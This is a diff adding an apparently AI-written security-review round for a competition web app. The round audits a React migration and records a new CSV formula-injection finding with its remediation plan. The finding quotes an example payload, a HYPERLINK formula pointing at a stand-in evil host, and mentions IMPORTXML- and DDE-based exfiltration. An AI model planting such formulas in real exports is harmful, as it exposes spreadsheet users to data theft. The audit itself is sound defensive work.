@@ -24,6 +24,7 @@
 | 2026-06-28 | Claude   | Re-review (9 new app commits #186–#194: GAP-scoring rewrites, build-time track-packer, static 3D-vis sample, bounded validator additions, audit-description improvement) | No new findings; `bun audit` clean; all prior fixes intact |
 | 2026-07-03 | Claude   | Re-review (33 new app commits #196–#230: v1 launch — MCP worker removed, super-admin allowlist + admin/cache/visualization routes, open-distance scoring format, Worker-served 3D replay `/replay`, Corryong + Big Chip samples, Teams/Top-3 scores, emergency-contact fields) → new findings SEC-22..27 | SEC-22 (High, stored XSS) + SEC-23/24/25 (Low) fixed inline (this PR); SEC-26 (Low) deferred; SEC-27 (Info) documented; `bun audit` clean |
 | 2026-07-05 | Claude   | Re-review (8 new app commits #233–#241: GAP no-SSS/no-ESS scoring fallbacks + task-setup warnings, default comp close date + Clear link, 3D-replay camera handover + desaturate/fade-white basemap controls, prior-year Corryong + Unungra sample comps) | **No new findings**; `bun audit` clean; all prior fixes intact; comp-detail consolidated onto the shared quote-safe `escapeHtml` (partial scope-gap #11) |
+| 2026-07-06 | Claude   | Re-review, deep focus on the **Basecoat → React + Base UI migration** (#240, ~95 frontend files) per operator request; plus #245 (Profile merged into Settings) and #244 (weekly deps). New finding SEC-28 (Low, CSV formula injection — pre-existing, carried into the React port); SEC-25 closed moot (file deleted); SEC-24 fix confirmed carried into the React port; one Info-level href-encoding hygiene fix inline | SEC-28 documented (deferred); `bun audit` clean; main UI no longer has any `innerHTML` sink |
 
 ---
 
@@ -1915,3 +1916,119 @@ Carried forward (unfinished from prior rounds); nothing new added this round:
 4. Close SEC-26 (packer decompression cap) and finish scope-gaps #11/#12.
 5. Watch for the first super-admin **write** endpoint beyond cache-clear — it needs its own authz + audit review (and possibly a null-`comp_id`-tolerant `audit_log` schema).
 6. Do NOT re-open SEC-03 (accepted by design).
+
+---
+
+## 2026-07-06 — Re-review (Basecoat → React + Base UI migration deep-dive)
+
+> Operator-requested focus: the just-merged **Basecoat → React + Base UI migration** (#240), a ~95-file frontend change that replaced the vanilla-TS main UI (home, competitions, comp/task detail, scores, dashboard, settings, onboarding, admin pages) with a React SPA under `web/frontend/src/react/`, built on shadcn/ui components over Base UI. Window: 4 commits on top of the prior round's recorded HEAD `c714baa` — **#240** (the migration), `8e63fc0` (#242, the prior 2026-07-05 review's own PR — already documented, excluded), **#245** (My Profile merged into the Settings page), and **#244** (weekly dependency upgrade). **Zero worker / engine / Pages-Functions source changes in the window** — this round is almost entirely frontend. One new finding: **SEC-28 (Low)** — spreadsheet formula injection in the pilots CSV export, carried verbatim from the deleted vanilla exporter (pre-existing, not a migration regression). The migration itself is a **net security improvement**: the main UI now has no `innerHTML`-class sink at all.
+
+### Methodology
+
+- Read `docs/security-review.md` end-to-end first. Per scope-gap #9, the review base is the prior round's recorded HEAD `c714baa` (`git merge-base --is-ancestor c714baa HEAD` → true; HEAD = `f3bcae1`).
+- `git log --oneline c714baa..HEAD` → 4 commits; #242 is the prior review's own PR, excluded; #240 / #245 / #244 reviewed this round.
+- Scoped infra diff (`**/wrangler.toml`, `functions/**`, `_headers`, `sw.js`, `Dockerfile.dev`, `docker-compose.yml`) → only **`web/frontend/public/_redirects`** changed: every SPA route now rewrites to `/` (the React entry) instead of per-page HTML files, plus `301`s from the retired static URLs (`/about.html` → `/about`, etc.). Same-origin path rewrites only — no new public surface, no new worker route, no new binding.
+- Non-frontend diff is confined to `package.json` version bumps (root + 3 workers), tsconfig/README/e2e-spec updates, and the deletion of `web/scripts/update-google-fonts.sh`. **No worker or engine source file changed.**
+- **#240 deep-dive** (the requested focus). Full-tree greps over `web/frontend/src/react/` for `dangerouslySetInnerHTML` / `innerHTML` / `insertAdjacentHTML` / `outerHTML` / `document.write` → **zero hits**; `eval` / `new Function` / string-arg `setTimeout` → zero; `localStorage`/`sessionStorage`/`document.cookie` → only `localStorage.clear()` in the delete-account flow. Then two independent file-by-file passes over all 16 pages, 9 comp components, the shell, the lib helpers, and the 17 shadcn `ui/` wrappers, checking: HTML sinks, URL construction into `href`/`src`/`location.*`/`window.open`, server error bodies rendered as HTML, blob downloads, client-side admin gating vs server enforcement, KaTeX configuration, and secret handling. Key spot-checks:
+  - Every dynamic `href` passes its interpolations through `encodeURIComponent` (`TrackSection.tsx`, `Dashboard.tsx`, `Scores.tsx` `analysisHref`, `ActivitySection.tsx`, `AdminUsers.tsx:123` — the SEC-24 fix carried into the React port). One consistency exception fixed inline this PR (see executive summary).
+  - No full URL from API data is ever navigated to or rendered as a link; all data-derived links are relative paths. All external `target="_blank"` links carry `rel="noopener"` (most also `noreferrer`).
+  - `Onboarding.tsx` `window.location.assign(dest)`: `dest` is `` `/u/${usernameResult.username}` `` — a same-origin path built from the server's `setUsername` response, not from any query param. No open-redirect surface.
+  - KaTeX (`ScoringGap.tsx`): `renderMathInElement` runs over a subtree containing **only hard-coded `String.raw` formula literals**; `trust` is unset (defaults to false, so `\href`/`\url` stay disabled). `Scoring.tsx` / `ScoringOpenDistance.tsx` use no KaTeX.
+  - `Settings.tsx` (also covers **#245**): the created API key is rendered once as a text node in a dialog and never persisted client-side; revoke/list/create all hit `/api/auth/api-key/*` with cookie auth; profile PATCH sends a sparse validated payload; delete-account clears `localStorage` + IndexedDB then hard-navigates to `/`.
+  - Admin pages (`AdminUsers.tsx`, `AdminCache.tsx`): usernames/emails rendered as JSX text; the client-side `is_super_admin` check only hides UI — the destructive `DELETE /api/admin/cache` and the user list rely entirely on server-side authorization (correct pattern).
+  - `PilotStatusSection.tsx` `canEdit` compares `pilot.linked_email === user.email` — behaviour-identical to the deleted vanilla `comp-detail.ts` (checked at `c714baa`), and safe: the server's SEC-15 serialiser still nulls `linked_email` for non-admins, and the server re-validates every status mutation (403 surfaced in the UI).
+- **Vanilla remainder** (#240's analysis/replay edits): the Basecoat JS bundles were replaced by a local `analysis/command-menu.ts` — read in full; it only toggles classes/ARIA attributes and never constructs HTML (its filter reads `dataset.filter`/`textContent`). `analysis.html` also **removed an inline `onclick=` handler** in favour of `addEventListener` (a small CSP-readiness win). `replay/main.ts` just imports the extracted `replay.css`. `preferences-sync.ts` dropped its theme half (the theme editor was retired with #240) — pure deletion, no new surface.
+- **#244 deps**: `bun install` then `bun audit` at HEAD → **0 vulnerabilities**, over a substantially churned `bun.lock` (React 19, react-router-dom 7, @base-ui/react, sonner, lucide-react, cva/clsx/tailwind-merge added by #240; wrangler/workers-types/better-auth/tailwind bumps from #244). All 15 `overrides` in root `package.json` still resolve (the list has grown from 8 via the weekly upgrade routine — kysely, qs, ws, shell-quote et al. all held).
+- Re-walked every prior `SEC-NN` against current code (status table below) — several fixes moved files because #240 deleted the vanilla pages; each was traced to its React successor.
+- `bun run typecheck:all` → clean. `bun run test:all` → **845 pass / 0 fail** (501 root/engine + 56 auth-api [+6 todo] + 288 competition-api; the `Decompressed file too large` / `Decompression failed` stderr lines are the SEC-11 gzip-bomb tests asserting rejection, as in prior rounds). Both re-run after this round's inline edit.
+- Did **not** re-run a dynamic CSRF PoC, live cookie checks, a Cloudflare zone snapshot, or a CSP flip (scope-gaps 1/2/4/8). Did **not** re-fuzz parsers (no new parser landed).
+
+### Executive summary
+
+**One new finding, Low.** SEC-28: the pilots CSV export (`web/frontend/src/react/comp/csv.ts` `csvEscape`) applies correct RFC-4180 quoting but does not neutralise spreadsheet formula triggers — a registered pilot name like `=HYPERLINK(...)` is written verbatim into the file a comp admin downloads and may execute when opened in Excel/Sheets. The code is a **verbatim port of the deleted vanilla exporter** (`comp/pilots-section.ts` at `c714baa` had the identical `csvEscape`), so this is pre-existing, not a migration regression; documented and deferred per the Low-severity policy. Beyond that, the requested #240 deep-dive came back **clean, and structurally better than what it replaced**: the React tree contains zero `dangerouslySetInnerHTML` and zero raw DOM HTML writes, so the entire SEC-22/23/24/25 sink class is now confined to the two remaining vanilla entries (analysis page, 3D replay) — SEC-05's "innerHTML is the default primitive" no longer describes the main UI at all. One Info-level hygiene fix applied inline: `TaskDetail.tsx` interpolated `useParams` values into an `href` without `encodeURIComponent` (not exploitable — JSX attribute assignment prevents quote-breakout and router params can't contain `/` — but now consistent with every other link). `bun audit` is clean on the post-upgrade lockfile, all 15 dependency overrides held, and every prior fix is intact or accounted for.
+
+### Status of prior findings
+
+| ID      | Title                                                                  | Status @ 2026-07-06 | Notes                                                                |
+|---------|------------------------------------------------------------------------|---------------------|----------------------------------------------------------------------|
+| SEC-01  | Reflective CORS w/ credentials                                         | **Fixed**           | `isAllowedOrigin` allowlist intact (`auth-api/src/index.ts:16,30`, `competition-api/src/index.ts:29,41`). No worker src change in window. |
+| SEC-02  | No security response headers (`_headers`)                              | **Fixed (2026-05-25)** | `_headers` unchanged; CSP still Report-Only (scope-gap #8 — see updated note there re the Onboarding avatar). |
+| SEC-03  | Admin emails returned on public comp detail                            | **Accepted (by design)** | Unchanged; do not re-open. React `CompDetail.tsx` renders them as JSX text. |
+| SEC-04  | IGC upload size/shape — manufacturer-record check                      | **Fixed (2026-06-08)** | `igc-validation.ts` untouched; still called from `routes/igc.ts` + `routes/user-files.ts`. React `TrackSection` upload keeps the client-side 5 MB / `.igc` pre-checks. |
+| SEC-05  | `innerHTML` is the default render primitive                            | **Open — materially narrowed** | #240 removed the entire vanilla main UI: the React tree has **zero** `innerHTML`-class sinks (grep-verified). The finding now applies only to the vanilla analysis page + 3D replay. Scope-gap #11 narrowed accordingly. |
+| SEC-06  | No JSON body-size cap                                                  | **Fixed (2026-06-12)** | `bodyLimit` intact on both public workers. |
+| SEC-07  | Dev-only endpoints gated by `BETTER_AUTH_URL` hostname                 | **Verified safe**   | No infra change in window; still load-bearing for SEC-27. |
+| SEC-08  | Rate-limit headers not surfaced                                        | **Fixed (2026-06-11)** | Auth-api 429 `Retry-After` path intact. |
+| SEC-09  | `Math.random()` non-security use                                       | **Closed (Info)**   | No security-sensitive randomness in the React tree. |
+| SEC-10  | Auth bypass via trusted `X-Glidecomp-Internal-User` header             | **Fixed**           | `grep INTERNAL_USER_HEADER\|X-Glidecomp-Internal-User web/workers/*/src` → 0. |
+| SEC-11  | IGC gzip-bomb decompression                                            | **Fixed**           | `validateAndDecompressIgc` untouched; gzip-bomb regression tests still assert rejection in `test:all`. |
+| SEC-12  | `xctsk` body shape/depth/size cap                                      | **Fixed**           | `xctskSchema` untouched (no comp-api change in window). |
+| SEC-13  | Service worker unsanitised share-target filenames                      | **Fixed (2026-06-01)** | `sw.js` unchanged in window. |
+| SEC-14  | Service-binding trust comment misleads readers                         | **Closed / moot**   | MCP worker still deleted. |
+| SEC-15  | Unauthenticated PII on public pilot list                               | **Fixed**           | `serializeCompPilotPublic` intact (`routes/pilot.ts:127`; GET pilot list picks it at `:422` for non-admins). Traced the React consumers: `PilotStatusSection`'s `linked_email` comparison only ever sees non-null for admins — same as the vanilla code it replaced. |
+| SEC-16  | Transitive `kysely` JSON-path traversal                                | **Fixed**           | Override held through the #240/#244 lockfile churn; `bun audit` clean. |
+| SEC-17  | `qs` (DoS) / `ws` (memory disclosure)                                  | **Fixed**           | Overrides held; `bun audit` clean. |
+| SEC-18  | Transitive `shell-quote` newline-escaping bypass                       | **Fixed (2026-06-11)** | Override held; `bun audit` clean. |
+| SEC-19  | Dirty `bun audit` — 11 transitive advisories                           | **Fixed (2026-06-20)** | All 15 overrides resolve; `bun audit` clean at HEAD despite the largest lockfile change since the finding. |
+| SEC-20  | `parseXCTask` `TypeError` on untrusted input                           | **Fixed (2026-06-21)** | Engine untouched this window. |
+| SEC-21  | `parseXCTaskAsync` deflate-path `TypeError` + unhandled rejection      | **Fixed (2026-06-21)** | Engine untouched this window. |
+| SEC-22  | Stored XSS via unescaped comp pilot name in score tables + map HUD     | **Fixed (2026-07-03)** | The vanilla analysis-page sinks (`analysis-panel.ts`, `mapbox-provider.ts`) are unchanged and still `escapeHtml`-wrapped. The React SPA's new render sites for pilot/team/comp/task names are all JSX text children (auto-escaped) — verified across `ScoresSection`, `PilotsSection`, `Scores`, `ActivitySection`. |
+| SEC-23  | Replay gaggle tooltip renders turnpoint name into `innerHTML`          | **Fixed (2026-07-03)** | `gaggle-ui.ts` unchanged in window. |
+| SEC-24  | Super-admin users page interpolates username into `href`               | **Fixed — moved**   | `admin-users.ts` was **deleted** by #240; the React port keeps the fix: `react/pages/AdminUsers.tsx:123` links via `encodeURIComponent(u.username)` inside a router `Link`. |
+| SEC-25  | `comp-detail.ts` quote-unsafe `escapeHtml` in a `value` attribute      | **Closed / moot**   | `comp-detail.ts` was **deleted** by #240; its React successor (`CompDetail.tsx` + `comp/fields.tsx`) renders values via JSX attribute assignment, which is not subject to quote-breakout. The vulnerable pattern no longer exists. |
+| SEC-26  | 3D-replay packer decompresses stored IGC without the SEC-11 cap        | **Open (deferred)** | `visualization.ts` unchanged this window; still not exploitable (every stored blob passed the SEC-11 upload validator). Remains scope-gap #10. |
+| SEC-27  | Super-admin allowlist matches on email alone, not `email_verified`     | **Open (Info)**     | `super-admin.ts` unchanged; still safe under SEC-07. Defense-in-depth `email_verified` gate still recommended. |
+
+### New findings
+
+#### SEC-28 — Pilots CSV export writes spreadsheet formula triggers verbatim (CSV/formula injection) — **Low** — Open (documented)
+
+- **Files:** `web/frontend/src/react/comp/csv.ts:238-245` (`csvEscape`, used by `exportCsvContent`), reached from `react/comp/PilotsSection.tsx` (`exportCsv` → `downloadFile`).
+- **Evidence:** `csvEscape` quotes values containing `" , \n \r` per RFC 4180 but does not neutralise cell values beginning with `=`, `+`, `-`, `@`, tab, or CR. Pilot-controlled strings (a linked pilot's profile name flows into `registered_pilot_name`; team/glider/driver fields are admin- or import-controlled) are serialised verbatim into `pilots-<comp>.csv`.
+- **Impact:** A registered pilot who sets their display name to e.g. `=HYPERLINK("https://evil.example","total")` gets that formula into the CSV a comp admin exports; opening it in Excel / Google Sheets can execute the formula (data exfiltration via `HYPERLINK`/`IMPORTXML`-class functions, or worse via DDE on legacy Excel). Requires the victim to export **and** open the file in a spreadsheet app, and modern spreadsheet apps warn on load — hence Low.
+- **Not a regression:** the deleted vanilla exporter (`comp/pilots-section.ts` at `c714baa`) had the byte-identical `csvEscape`; #240 ported it faithfully.
+- **Remediation (next round):** in `csvEscape`, prefix any value matching `/^[=+\-@\t\r]/` with `'` (the standard neutralisation). Decide the round-trip story first: the export doubles as the re-import template, so the importer (`parseImportedCsv`) should strip one leading `'` from cells to keep export→import idempotent, and a unit test should pin both directions. Deferred rather than fixed inline because the round-trip semantics deserve a deliberate decision, and severity is Low.
+
+*(Also applied inline, below finding-threshold: `react/pages/TaskDetail.tsx:309` now wraps its `useParams` values in `encodeURIComponent` inside the task-route `href`, matching every other link in the tree. Not exploitable — JSX attribute assignment prevents quote-breakout and react-router path params cannot contain `/` — logged here so the next round doesn't re-flag it.)*
+
+### Re-checked but no change
+
+- **Authn / authz.** Zero worker source changes; no new endpoint, route, or binding. The React SPA's admin gating (`/api/admin/whoami` check in `Settings.tsx`, 403 handling in `AdminUsers`/`AdminCache`) is cosmetic only — every mutation still authorises server-side. All comp mutations from the new UI hit the same `requireAuth`/`isCompAdmin`-gated endpoints as before.
+- **CORS.** Both public workers' allowlists unchanged.
+- **Input validation.** No validator change (no worker src change). The React forms add client-side niceties (5 MB IGC pre-check, `maxLength` on names) on top of the unchanged server caps.
+- **SQL.** No query changes anywhere in the window.
+- **Audit logging.** No mutating handler added, removed, or modified. The React `ActivitySection` renders audit descriptions/actor names as JSX text.
+- **DOM sinks / untrusted flow.** The React tree: zero HTML sinks (grep + two independent file-by-file passes). Vanilla analysis/replay: only wiring changes this window (`command-menu.ts` toggles attributes, never HTML; an inline `onclick` was removed from `analysis.html`). All prior `escapeHtml` call sites intact.
+- **File uploads.** Server paths unchanged; React `TrackSection`/`Dashboard` upload flows call the same endpoints with cookie auth.
+- **Secrets.** No hard-coded keys; the one secret-shaped value in the new UI (a freshly created API key) is displayed once as a text node and never persisted client-side. No tokens in `localStorage`.
+- **Headers / infra.** `_headers`, `sw.js`, all `wrangler.toml`s, `functions/` untouched. `_redirects` change is same-origin path rewrites + 301s only.
+- **Dependencies.** `bun audit` clean over the post-#240/#244 lockfile; all 15 overrides resolve.
+- **Parsers.** Engine untouched; scope-gap #3 stays closed.
+
+### Scope gaps still not done
+
+Carried forward, with two updates:
+
+1. Dynamic CSRF PoC against the allowlisted CORS.
+2. Cookie attribute verification on a live deploy.
+3. ~~IGC / XCTask parser fuzzing~~ — closed 2026-06-21; re-open only if a new parser/format lands.
+4. Cloudflare zone settings snapshot (HSTS, TLS min, WAF, bot management).
+5. Verify SEC-10 fix on a deployed comp-api endpoint (not just the miniflare regression test).
+6. Confirm the comp-api worker doesn't accept a legacy `Cookie: test-user=…` header in production (static check clean; live confirmation pending).
+7. TOCTOU / idempotency on `/api/user/tracks` + `/api/user/tasks` quota checks (UX class, no security exposure).
+8. **Flip CSP from Report-Only to enforced** — *updated this round:* before flipping, add `https://lh3.googleusercontent.com` (Google profile avatars, rendered by `Onboarding.tsx`) to `img-src`, and re-validate the `/replay` Mapbox origins. `style-src` already carries `'unsafe-inline'`, so Base UI/sonner inline styles are covered; the React bundle itself is `'self'`-clean (no inline scripts in `index.html`).
+9. Review-base selection must derive from the doc's recorded HEAD (applied again this round; base `c714baa`, `merge-base --is-ancestor` confirmed).
+10. **SEC-26 packer decompression cap** — add the SEC-11 streaming cap + track-count bound to `buildTask3dvisBundle`, with a test.
+11. **`escapeHtml` consolidation + lint rule** — *narrowed by #240:* the main UI is React and sink-free, so this now covers only the vanilla analysis page + 3D replay. Concrete close-out: consolidate their remaining per-file `escapeHtml` copies onto `web/frontend/src/escape-html.ts`, add a lint rule forbidding `innerHTML =` with interpolated non-constant template literals in `src/analysis/**` + `src/replay/**`, and a second rule forbidding `dangerouslySetInnerHTML` in `src/react/**` (currently zero uses — pin it there).
+12. **Frontend vitest suite hygiene:** unchanged — `src/replay/gaggle-hull.test.ts` and `src/replay/terrain-follow.test.ts` still import `bun:test` while `vitest.config.ts` globs `src/**/*.test.ts`, and `test:all` still omits the frontend vitest suite entirely (it runs root/engine + auth + comp only).
+13. **SEC-28 close-out:** formula-prefix neutralisation in `csvEscape` + import-side `'`-strip + round-trip unit test (see the finding for the design note).
+
+### Where to start the next review
+
+1. Commit reviewed up to: HEAD = `f3bcae1` (base `c714baa`). Derive the next base from this recorded HEAD per scope-gap #9.
+2. **The XSS risk profile moved.** With the main UI on React, new `dangerouslySetInnerHTML` uses (currently zero) are the thing to grep for in `src/react/**`; the legacy `innerHTML + ${...}` pattern now only matters in `src/analysis/**` and `src/replay/**`. Comp-controlled strings are still stored unencoded server-side, so any new vanilla render site remains the SEC-22-class risk.
+3. `bun audit` should stay clean; the weekly upgrade routine keeps growing the overrides list (now 15) — when one stops resolving, walk reachability per the SEC-16..19 template.
+4. Close SEC-26 (packer cap), SEC-28 (CSV formula neutralisation, gap #13), and gaps #11/#12.
+5. Watch for the first super-admin **write** endpoint beyond cache-clear — it needs its own authz + audit review.
+6. The React SPA introduced `react-router-dom@7` — if loaders/actions or SSR ever get adopted, re-review data flow (today it's a plain client-side `BrowserRouter`, no loader surface).
+7. Do NOT re-open SEC-03 (accepted by design).
